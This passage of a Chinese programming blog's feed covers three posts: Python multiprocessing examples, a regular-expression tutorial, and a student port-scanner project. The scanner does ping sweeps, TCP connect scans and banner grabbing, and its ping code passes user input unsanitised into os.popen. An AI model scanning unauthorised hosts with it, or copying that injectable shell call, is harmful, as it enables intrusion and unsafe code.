<ul>
<li>blocked = True</li>
</ul>
<blockquote>
<p>Queue 有一个值可用，立刻返回改值；Queue 没有任何元素</p>
</blockquote>
</li>
<li><p>Queue实例</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> multiprocessing <span class="keyword">import</span> Process, Queue</span><br><span class="line"><span class="keyword">import</span> os, time, random</span><br><span class="line"> </span><br><span class="line"><span class="comment">#写数据进程</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">proc_write</span><span class="params">(q,urls)</span>:</span></span><br><span class="line">    print(<span class="string">'Process &#123;0&#125; is writing...'</span>.format(os.getpid()))</span><br><span class="line">    <span class="keyword">for</span> url <span class="keyword">in</span> urls:</span><br><span class="line">        q.put(url)</span><br><span class="line">        print(<span class="string">'Put %s to queue..'</span> % url)</span><br><span class="line">        time.sleep(random.random())</span><br><span class="line"> </span><br><span class="line"><span class="comment">#读数据进程</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">proc_read</span><span class="params">(q)</span>:</span></span><br><span class="line">    print(<span class="string">'Process &#123;0&#125; is reading...'</span>.format(os.getpid()))</span><br><span class="line">    <span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">        url = q.get(<span class="keyword">True</span>)</span><br><span class="line">        print(<span class="string">'Get %s from queue...'</span> % url)</span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    q = Queue()</span><br><span class="line">    proc_write1 = Process(target=proc_write,args=(q,[<span class="string">'url_1'</span>,<span class="string">'url_2'</span>,<span class="string">'url_3'</span>,<span class="string">'url_4'</span>]))</span><br><span class="line">    proc_write2 = Process(target=proc_write,args=(q,[<span class="string">'url_4'</span>,<span class="string">'url_5'</span>,<span class="string">'url_6'</span>]))</span><br><span class="line">    proc_reader = Process(target=proc_read,args=(q,))</span><br><span class="line">    <span class="comment">#启动子进程写入</span></span><br><span class="line">    proc_write1.start()</span><br><span class="line">    proc_write2.start()</span><br><span class="line">    <span class="comment">#启动子进程读取</span></span><br><span class="line">    proc_reader.start()</span><br><span class="line">    <span class="comment">#等待写入进程结束</span></span><br><span class="line">    proc_write1.join()</span><br><span class="line">    proc_write2.join()</span><br><span class="line">    <span class="comment">#proc_reader进程是死循环，无法等待结束，只能强行终止</span></span><br><span class="line">    proc_reader.terminate()</span><br></pre></td></tr></table></figure>
<p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1529159995.04.png" alt></p>
</li>
</ul>
</li>
<li><p>multiprocessing提供的Pipe(常用来在两个进行间的通信，两个进程分别位于<strong>管道的两端</strong>)</p>
<ul>
<li><p>multiprocessing.Pipe([duplex])</p>
</li>
<li><p>pipe实例一（发送列表）</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> multiprocessing <span class="keyword">import</span> Process, Pipe</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">send</span><span class="params">(pipe)</span>:</span></span><br><span class="line">    pipe.send([<span class="string">'spm'</span>]+[<span class="number">545</span>,<span class="string">'wdd'</span>])  <span class="comment">#send传输一个列表</span></span><br><span class="line">    pipe.close()</span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    <span class="comment">#实例化两个pipe对象，因为pipe进程通信实在管道的两边</span></span><br><span class="line">    (c1,c2) = Pipe()</span><br><span class="line">    sender = Process(target=send,args=(c1,))</span><br><span class="line">    sender.start()</span><br><span class="line">    print(<span class="string">"c2 got: &#123;0&#125; "</span>.format(c2.recv()))</span><br><span class="line">    c2.close()</span><br></pre></td></tr></table></figure>
<p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1529160762.62.png" alt></p>
</li>
<li><p>pipe实例二（发送字典文件）</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> multiprocessing <span class="keyword">import</span> Process, Pipe</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">talk</span><span class="params">(pipe)</span>:</span></span><br><span class="line">    pipe.send(dict(name=<span class="string">'ss'</span>,age=<span class="number">22</span>))</span><br><span class="line">    reply = pipe.recv()</span><br><span class="line">    print(<span class="string">'talk got:'</span>,reply)</span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    (a1, a2) = Pipe()</span><br><span class="line">    c = Process(target=talk, args=(a2,))  <span class="comment">#创建一个进程</span></span><br><span class="line">    c.start()</span><br><span class="line">    print(<span class="string">'parent got:'</span>,a1.recv())</span><br><span class="line">    a1.send(&#123;x * <span class="number">2</span> <span class="keyword">for</span> x <span class="keyword">in</span> <span class="string">'spam'</span>&#125;)</span><br><span class="line">    c.join()                 <span class="comment">#传输的数据被 talk 函数内的 pip 管道接收，并赋值给 reply</span></span><br><span class="line">    print(<span class="string">'parent exit'</span>)</span><br></pre></td></tr></table></figure>
<p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1529161528.8.png" alt></p>
</li>
</ul>
</li>
<li><p>上述的queue和pipe都是进程间的通信，实在一个进行池中，如果不在一个进程池中，用multiprocessing.Manager().Queue() 通信；同时：子进程与父进程的通信试用subprocess比较好</p>
<ul>
<li><p>不同进程池之间的通信实例如下</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> multiprocessing <span class="keyword">import</span> Process,Pool,Queue,Manager</span><br><span class="line"><span class="keyword">import</span> os,time,random</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">write</span><span class="params">(q,list,i)</span>:</span></span><br><span class="line"> </span><br><span class="line">    print(<span class="string">"[+] This is Process_"</span>+str(i)+<span class="string">" and pid is %s START"</span>%os.getpid())</span><br><span class="line">    <span class="keyword">for</span> item <span class="keyword">in</span> list:</span><br><span class="line">        q.put(item)</span><br><span class="line">        print(<span class="string">"[+] Pid %s Put : %s"</span>%(os.getpid(),item))</span><br><span class="line">    print(<span class="string">"[+] This is Process_"</span>+i+<span class="string">" and pid is %s CLOSE"</span>%os.getpid())</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">test</span><span class="params">()</span>:</span></span><br><span class="line">     print(os.getpid())</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">read</span><span class="params">(q)</span>:</span></span><br><span class="line">     print(<span class="string">'[====] Process to Read , pid = %s'</span>%os.getpid())</span><br><span class="line">     <span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">         data = q.get(<span class="keyword">True</span>)</span><br><span class="line">         print(<span class="string">"[=] data from Queue : %s"</span>%str(data))</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">     manager = Manager()</span><br><span class="line">     q = manager.Queue()</span><br><span class="line">     p = Pool(<span class="number">5</span>)</span><br><span class="line">     listx = []</span><br><span class="line">     listx.append([x <span class="keyword">for</span> x <span class="keyword">in</span> range(<span class="number">10</span>)])</span><br><span class="line">     listx.append([x <span class="keyword">for</span> x <span class="keyword">in</span> range(<span class="number">100</span>,<span class="number">110</span>)])</span><br><span class="line">     listx.append([x <span class="keyword">for</span> x <span class="keyword">in</span> range(<span class="number">200</span>,<span class="number">210</span>)])</span><br><span class="line">     listx.append([x <span class="keyword">for</span> x <span class="keyword">in</span> range(<span class="number">300</span>,<span class="number">310</span>)])</span><br><span class="line">     listx.append([x <span class="keyword">for</span> x <span class="keyword">in</span> range(<span class="number">400</span>,<span class="number">410</span>)])</span><br><span class="line">     <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">5</span>):</span><br><span class="line">         <span class="keyword">if</span> i==<span class="number">4</span>:</span><br><span class="line">             <span class="keyword">pass</span></span><br><span class="line">             p.apply_async(read,args=(q,))</span><br><span class="line">         <span class="keyword">else</span>:</span><br><span class="line">             list = listx[i]</span><br><span class="line">             <span class="comment">#print(list)</span></span><br><span class="line">             p.apply_async(write,args=(q,list,i))</span><br><span class="line">     p.close()</span><br><span class="line">     p.join()</span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">     main()</span><br></pre></td></tr></table></figure>
<p> <img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1529162485.23.png" alt></p>
</li>
</ul>
</li>
</ol>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><blockquote>
<p>通过一些实例学习python3的多进程，包含了主要的两个类及其适用方法；同一进程池中进程间通信，不同进程池中进程间的通信以及父类与子类的进程间通信</p>
</blockquote>
]]></content>
      <categories>
        <category>python</category>
      </categories>
      <tags>
        <tag>python</tag>
        <tag>编程</tag>
        <tag>多进程</tag>
      </tags>
  </entry>
  <entry>
    <title>python3正则表达式学习</title>
    <url>/2018/06/15/python3%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F%E5%AD%A6%E4%B9%A0/</url>
    <content><![CDATA[<ol>
<li><p>python3正则表达式学习</p>
<blockquote>
<p>正则表达式是一个特殊的字符序列，它能帮助你方便检查一个字符串是否与某种模式匹配。python提供re模块使python语言拥有全部正则表达式功能。</p>
<p>compile函数根据一个模式字符串和可选的标志参数生成一个正则表达式对象。该对象拥有一系列方法用于正则表达式匹配和替换。</p>
</blockquote>
</li>
<li><p>正则表达式基础</p>
<ul>
<li><p>子模式</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">\w: 匹配任意字母、数字、或者_</span><br><span class="line">\d: 匹配数字（十进制）</span><br><span class="line">\s: 匹配空白符号（空格、tab等）</span><br><span class="line">. : 匹配任意字符（换行符除外）</span><br></pre></td></tr></table></figure>
</li>
<li><p>重复子模式</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">\d* : 表示任意数字，包括0个，*匹配0次或者多次</span><br><span class="line">\w+ : 表示匹配至少一个字母、数字、或者_</span><br><span class="line">\w&#123;3:6&#125; :表示匹配3-6之间的字母、数字、或者_</span><br></pre></td></tr></table></figure>
</li>
<li><p>“或”运算  - |</p>
<p><code>(p|P)ython :可以匹配Python也可以匹配python</code> </p>
</li>
<li><p>选择符：？</p>
</li>
<li><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">(https://)?(www.)?(lsowl.xyz) :可以匹配到：https://www.lsowl.xyz  https://lsowl.xyz www.lsowl.xyz  lsowl.xyz 四个，也就是字符串必须在最后一个元组才可以被匹配到</span><br></pre></td></tr></table></figure>
<p>字符集：[]</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[a-zA-Z0-9_] : 等价于\w</span><br><span class="line">[0-9a-zA-Z\.\_] : 匹配数字、字母、.和_</span><br></pre></td></tr></table></figure>
</li>
<li><p>开始符和结尾符：^ , $</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">^\d : 以数字开始</span><br><span class="line">\w$ : 以字母结尾</span><br><span class="line">^[a-zA-Z][0-9a-zA-Z\_]* :匹配python的合法变量</span><br></pre></td></tr></table></figure>
</li>
<li><p>分组: ()</p>
<ul>
<li><p>捕获组</p>
<p><code>(^[0-9a-zA-Z]\w{5,17})@[0-9a-zA-Z]+\.\w+ : 匹配邮箱用户名</code><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1529035700.3.png" alt></p>
</li>
<li><p>非捕获组</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">(^[0-9a-zA-Z]\w&#123;5,17&#125;)@[0-9a-zA-Z]+\.(?:net|com|top|cn) ：捕获指定后缀名的邮箱用户名</span><br><span class="line"></span><br><span class="line">(?:\d+\.)&#123;3&#125;\d+ : 匹配IP</span><br></pre></td></tr></table></figure>
</li>
</ul>
</li>
<li><p>正则表达式使用的特殊符号和字符</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">literal 匹配字符串的值</span><br><span class="line">re1|re2 匹配正则表达式re1或re2</span><br><span class="line">. 匹配任意字符（换行符除外）</span><br><span class="line">^ 匹配字符串的开始</span><br><span class="line">$ 匹配字符串的结尾</span><br><span class="line">* 匹配前面出现的正则表达式零次或多次</span><br><span class="line">+ 匹配前面出现的正则表达式一次或多次</span><br><span class="line">？匹配前面出现的正则表达式零次或一次</span><br><span class="line">&#123;N&#125; 匹配前面出现的正则表达式N次</span><br><span class="line">&#123;M,N&#125; 匹配重复出现M次到N次的正则表达式</span><br><span class="line">[…] 匹配字符组里出现的任意一个字符</span><br><span class="line">[…x-y…] 匹配从字符x到y中的任意一个字符</span><br><span class="line">[^…] 不匹配此字符集中出现的任意一个字符</span><br><span class="line">(*|+|?|&#123;&#125;)? 用于上面出现的任何“非贪婪”。版本重复匹配次数符号。如.*?a表示匹配到第一个a出现取前面任意长度的字符。</span><br><span class="line">(…) 匹配封闭括号中正则表达式（RE），并保存为子组</span><br><span class="line">\d 匹配任何数字，和[0-9]一样（\D是\d的反义：任何非数字）</span><br><span class="line">\w 匹配任何数字字母字符，和[A-Za-z0-9_]相同(\W是\w的反义)</span><br><span class="line">\s 匹配任何空白符，和[\n\t\r\v\f]相同（\S是\s的反义）</span><br><span class="line">\b 匹配单词边界(\B是\b的反义)</span><br><span class="line">\nn 匹配已保存的子组（参考(…)）如price:\16</span><br><span class="line">\c 逐一匹配特殊字符c（即，取消它的特殊含义，按字面匹配）</span><br><span class="line">\A（\Z）匹配字符串的起始（结束）</span><br></pre></td></tr></table></figure>
</li>
<li><p>一些说明</p>
<p>（1）用管道符号(|)匹配多个正则表达式<br>（2）匹配除换行符外任意一个单个的字符（.）<br>（3）从字符串的开头或结尾或单词边界开始匹配（^ $或\A \Z \b \B）<br>（4）创建字符类（[]）<br>（5）指定范围（-）和否定（^）<br>（6）使用闭包操作符（* + ？ {}）实现多次出现/重复匹配<br>（7）？的两种含义：</p>
<ul>
<li><p>表示匹配出现0或1次；</p>
</li>
<li><p>紧跟在表示重复的元字符后面时（如+?），表示要求搜索引擎匹配的字符串越短越好。(*+?{m,n})尽量“吸收”更多的字符，这叫“贪心”。</p>
</li>
</ul>
<p>（7）特殊字符表示、字符集</p>
<ul>
<li>\d表示十进制数字（\D表示非十进制数字）</li>
<li>\w表示整个字符数字的字符集（\W）</li>
<li>\s表示空白字符（\S）</li>
</ul>
<p>（8）用圆括号（()）组建组 、()的功能：对正则表达式进行分组；匹配子组。 </p>
<ul>
<li>对正则表达式进行分组可以实现用不同的正则表达式去匹配字符串，或重复整个正则表达式多次。 </li>
<li>使用子组匹配是为了能够提取匹配模式的内容，Python的re支持此功能。</li>
</ul>
</li>
</ul>
</li>
<li><p>python的re模块<img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1529038902.67.png" alt></p>
<ul>
<li><p>re模块的用法</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line">str = <span class="string">"xxxflag&#123;sss&#125;sss"</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># #用法1：</span></span><br><span class="line">re_flag = re.compile(<span class="string">r'flag&#123;\w+?&#125;'</span>)</span><br><span class="line">flag = re_flag.findall(str)</span><br><span class="line">print(flag)</span><br><span class="line"></span><br><span class="line"><span class="comment">#用法2：</span></span><br><span class="line">flag =re.findall(<span class="string">r'flag&#123;\w+?&#125;'</span>,str)</span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure>
</li>
<li><p>贪心匹配和非贪心匹配</p>
<ul>
<li>贪心匹配：正则表达尽可能多的匹配元素</li>
<li>非贪心匹配：正则表达式尽可能少的匹配元素<img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1529040261.44.png" alt></li>
</ul>
</li>
<li><p>match和search的区别</p>
<ul>
<li>match只匹配字符串的开始，如果字符串开始不符合正则表达式，则匹配失败，返回None</li>
<li>search匹配整个字符串，直到找到一个匹配<img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1529040638.88.png" alt></li>
</ul>
</li>
<li><p>分组匹配（优点在说明第（8）点）<img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1529041162.79.png" alt></p>
</li>
</ul>
</li>
<li><p>python中常用的正则表达式处理函数</p>
<ul>
<li>re.match() 尝试从字符串的起始位置匹配一个模式，如果不是起始位置就匹配成功，match返回none<img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1529047137.61.png" alt><ul>
<li>函数语法 <code>re.match(partten,string,flags=0)</code></li>
<li>函数参数说明<img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1529046903.24.png" alt></li>
<li>使用group(num)或groups()匹配对象函数来获取匹配表达式<img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1529047000.4.png" alt></li>
</ul>
</li>
<li>re.search() 扫描整个字符串并返回第一个成功的匹配<ul>
<li>函数语法 <code>re.search(pattern,string,flags=0)</code></li>
<li>使用group(num) 或 groups() 匹配对象函数来获取匹配表达式。</li>
</ul>
</li>
<li>re.sub()用于替换字符串中的匹配项<ul>
<li>函数语法 <code>re.sub(pattern,repl,string,count=0)</code></li>
<li>函数参数说明<img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1529047446.1.png" alt></li>
<li>使用实例(包含是否使用repl参数的，repl可能是个函数)<img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1529047654.68.png" alt><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1529048005.62.png" alt></li>
</ul>
</li>
<li>re.compile() 用于编译正则表达式，生成一个正则表达式对象供match和search两个函数使用<ul>
<li>函数语法 <code>re.compile(pattern[, flags])</code> </li>
<li>参数说明<img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1529048191.55.png" alt></li>
<li>使用实例（当匹配成功的时候返回一个match对象）<img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1529048612.56.png" alt><img src="assets/1529049199.01.png" alt></li>
</ul>
</li>
<li>re.findall() 在字符串中找到正则表达式所匹配的所有子串，并返回一个列表，如果没有找到匹配的，则返回一个空列表<ul>
<li>函数语法 <code>findall(string[, pos[, endpos]])</code></li>
<li>函数参数 <img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1529049378.54.png" alt></li>
<li>使用实例（用compile函数生成正则表达式对象）<img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1529049557.51.png" alt></li>
</ul>
</li>
<li>re.finditer() 和findall类似，在字符串中找到正则表达式所匹配的所有子串，并把它们作为一个迭代器返回<ul>
<li>函数语法 <code>re.finditer(pattern, string, flags=0)</code></li>
<li>函数参数<img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1529049714.1.png" alt></li>
<li>使用实例(用for循环迭代输出)<img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1529049815.39.png" alt></li>
</ul>
</li>
<li>re.split() split 方法按照能够匹配的子串将字符串分割后返回列表 <ul>
<li>函数语法 <code>re.split(pattern, string[, maxsplit=0, flags=0])</code></li>
<li>函数参数 <img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1529049924.84.png" alt></li>
<li>使用实例（对于一个找不到匹配的字符串，split不会分割）<img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1529050075.58.png" alt></li>
</ul>
</li>
</ul>
</li>
<li><p>正则表达式对象</p>
<ul>
<li><p>re.RegexObject  (re.compile() 返回的就是一个正则表达式对象)</p>
</li>
<li><p>group()返回被RE匹配的字符串</p>
</li>
<li><p>start() 返回开始匹配的位置</p>
</li>
<li><p>end()  返回匹配结束的位置</p>
</li>
<li><p>span()返回一个元组包含（开始，结束）的位置</p>
</li>
</ul>
</li>
</ol>
]]></content>
      <categories>
        <category>python</category>
      </categories>
      <tags>
        <tag>python</tag>
        <tag>正则表达式</tag>
      </tags>
  </entry>
  <entry>
    <title>简易端口扫描器</title>
    <url>/2018/06/14/%E7%AE%80%E6%98%93%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F%E5%99%A8/</url>
    <content><![CDATA[<blockquote>
<p>只是一次简单的课程设计，通过Python实现端口扫描器的功能，附加ping扫描以及简单的banner获取，支持导出扫描结果。</p>
</blockquote>
<h2 id="程序运行实例"><a href="#程序运行实例" class="headerlink" title="程序运行实例"></a>程序运行实例</h2><ul>
<li>打印装逼信息：<img src="http://demos-qq.oss-cn-beijing.aliyuncs.com/18-3-16/38144694.jpg" alt></li>
<li>扫描实例：<img src="C:\Users\ADMINI~1\AppData\Local\Temp\1521168691496.png" alt="52116869149"></li>
<li>具体用法程序中有说明</li>
</ul>
<h2 id="程序说明"><a href="#程序说明" class="headerlink" title="程序说明"></a>程序说明</h2><blockquote>
<p>程序中默认扫描一些常见的端口、支持用户设置端口、支持多端口扫描、支持多IP扫描、支持网段存活主机发现、支持导出。</p>
</blockquote>
<ol>
<li><p>通过发送ping包，根据返回包的TTL值判断主机是否存活，关键代码如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">run</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            cmd = [<span class="string">"ping"</span>, <span class="string">"-&#123;op&#125;"</span>.format(op=self.get_os()),</span><br><span class="line">          <span class="string">"1"</span>, self.ip_pre]</span><br><span class="line">            output = os.popen(<span class="string">" "</span>.join(cmd)).readlines()</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">False</span></span><br><span class="line">        <span class="keyword">if</span> lock.acquire():</span><br><span class="line">            flag = <span class="keyword">False</span></span><br><span class="line">            <span class="keyword">for</span> line <span class="keyword">in</span> list(output):</span><br><span class="line">                <span class="keyword">if</span> <span class="keyword">not</span> line:</span><br><span class="line">                    <span class="keyword">continue</span></span><br><span class="line">                <span class="keyword">if</span> str(line).upper().find(<span class="string">"TTL"</span>) &gt;=<span class="number">0</span>:</span><br><span class="line">                    flag = <span class="keyword">True</span></span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">if</span> flag:</span><br><span class="line">                <span class="keyword">print</span> <span class="string">"[+] IP: %s is OK "</span> % self.ip_pre</span><br><span class="line">                ip_str.append(self.ip_pre)</span><br><span class="line">            lock.release()</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">True</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>通过socket建立tcp全连接来判断端口开放信息以及banner信息的抓取，关键代码如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Ping</span><span class="params">(self, Port)</span>:</span></span><br><span class="line">        <span class="keyword">global</span> OpenPort, lock, Timeout</span><br><span class="line">        sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line">        sock.settimeout(Timeout)</span><br><span class="line">        address = (self.IP, Port)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            sock.connect(address)</span><br><span class="line">            ready = select.select([sock],[],[],<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">False</span></span><br><span class="line">        <span class="keyword">if</span> lock.acquire():</span><br><span class="line">            OpenPort.append(str(Port))</span><br><span class="line">            ScanIP_list.append(self.IP)</span><br><span class="line">            <span class="keyword">if</span> ready[<span class="number">0</span>]:</span><br><span class="line">                <span class="keyword">print</span> <span class="string">"IP:%s  Port:%d  Open  "</span> % (self.IP, Port)  +sock.recv(<span class="number">4096</span>)</span><br><span class="line">                sock.close()</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">print</span> <span class="string">"IP:%s  Port:%d  Open  "</span> % (self.IP, Port)  + <span class="string">"Unknow!\n"</span></span><br><span class="line">                sock.close()</span><br><span class="line">            lock.release()</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">True</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>通过队列来判断扫描目标的端口列表是否为空，通过判空来控制在端口扫描的时候不会漏扫，还有就是在多IP端口扫描的时候避免出现误扫IP的状况，关键代码如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">run</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">while</span> <span class="keyword">not</span> self.SingleQueue.empty():</span><br><span class="line">            p = self.SingleQueue.get()</span><br><span class="line">            self.Ping(p)</span><br></pre></td></tr></table></figure>
</li>
<li><p>调用cmd模块来进行交互，用户通过这个模块来设置线程（在中程序中控制在1-5000，可以修改）、设置连接超时时间、设置端口、进行端口扫描、ping扫描等。关键代码如下：（贴出设置端口、单IP扫描、ping扫描的代码，具体代码请看源码）</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">do_port</span><span class="params">(self, argv)</span>:</span></span><br><span class="line">        <span class="keyword">global</span> PortList</span><br><span class="line">        PortList = []</span><br><span class="line">        ListTmp = argv.split(<span class="string">' '</span>)</span><br><span class="line">        <span class="keyword">for</span> port <span class="keyword">in</span> ListTmp:</span><br><span class="line">            <span class="keyword">if</span> port.find(<span class="string">".."</span>) &lt; <span class="number">0</span>:</span><br><span class="line">                <span class="keyword">if</span> <span class="keyword">not</span> port.isdigit():</span><br><span class="line">                    <span class="keyword">print</span> <span class="string">"Input error!"</span></span><br><span class="line">                    <span class="keyword">return</span> <span class="keyword">False</span></span><br><span class="line">                PortList.append(int(port))</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                RangeLst = port.split(<span class="string">".."</span>)</span><br><span class="line">                <span class="keyword">if</span> <span class="keyword">not</span> (RangeLst[<span class="number">0</span>].isdigit() <span class="keyword">and</span> RangeLst[<span class="number">1</span>].isdigit()):</span><br><span class="line">                    <span class="keyword">raise</span> ValueError</span><br><span class="line">                    exit()</span><br><span class="line">                <span class="keyword">for</span> i <span class="keyword">in</span> range(int(RangeLst[<span class="number">0</span>]), int(RangeLst[<span class="number">1</span>])):</span><br><span class="line">                    PortList.append(i)</span><br></pre></td></tr></table></figure>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">do_scan</span><span class="params">(self, argv)</span>:</span></span><br><span class="line">        <span class="keyword">print</span> <span class="string">"Start Time %s"</span> % time.ctime() + <span class="string">'\n'</span></span><br><span class="line">        <span class="keyword">global</span> nThread, PortList, strIP, ScanIP_list, OpenPort</span><br><span class="line">        <span class="keyword">del</span> ScanIP_list[:]</span><br><span class="line">        <span class="keyword">del</span> OpenPort[:]</span><br><span class="line">        ThreadList = []</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            strIP = socket.gethostbyname(str(argv))</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">print</span> <span class="string">"Input error!"</span></span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">False</span></span><br><span class="line">        SingleQueue = GetQueue(PortList)</span><br><span class="line">        <span class="keyword">if</span> PortList != <span class="keyword">None</span>:</span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, nThread):</span><br><span class="line">                t = ScanThreadSingle(strIP, SingleQueue)</span><br><span class="line">                ThreadList.append(t)</span><br><span class="line">        <span class="keyword">for</span> t <span class="keyword">in</span> ThreadList:</span><br><span class="line">            t.start()</span><br><span class="line">        <span class="keyword">for</span> t <span class="keyword">in</span> ThreadList:</span><br><span class="line">            t.join()</span><br><span class="line">        <span class="keyword">print</span> <span class="string">'\n'</span> + <span class="string">"End Time %s"</span> % time.ctime()</span><br></pre></td></tr></table></figure>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">do_ping</span><span class="params">(self, argv)</span>:</span></span><br><span class="line">        <span class="keyword">global</span> commandargs</span><br><span class="line">        ThreadList = []</span><br><span class="line">        <span class="keyword">print</span> <span class="string">"Start Time %s"</span> % time.ctime() + <span class="string">'\n'</span></span><br><span class="line">        commandargs = str(argv)</span><br><span class="line">        <span class="keyword">print</span> <span class="string">"[+] Input is %s "</span> % commandargs + <span class="string">'\n'</span></span><br><span class="line">        args = <span class="string">""</span>.join(commandargs)</span><br><span class="line">        ip_prefix = <span class="string">'.'</span>.join(args.split(<span class="string">'.'</span>)[:<span class="number">-1</span>])</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">255</span>):</span><br><span class="line">            ip = <span class="string">'%s.%s'</span> % (ip_prefix,i)</span><br><span class="line">            s = PING(ip)</span><br><span class="line">            ThreadList.append(s)</span><br><span class="line">        <span class="keyword">for</span> s <span class="keyword">in</span> ThreadList:</span><br><span class="line">            s.start()</span><br><span class="line">        <span class="keyword">for</span> s <span class="keyword">in</span> ThreadList:</span><br><span class="line">            s.join()</span><br><span class="line">        <span class="keyword">print</span> <span class="string">'\n'</span> + <span class="string">"End Time %s"</span> % time.ctime()</span><br></pre></td></tr></table></figure>
</li>
<li><p>这些就是整个程序中核心的几个模块，具体代码请看源码。</p>
</li>
</ol>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><blockquote>
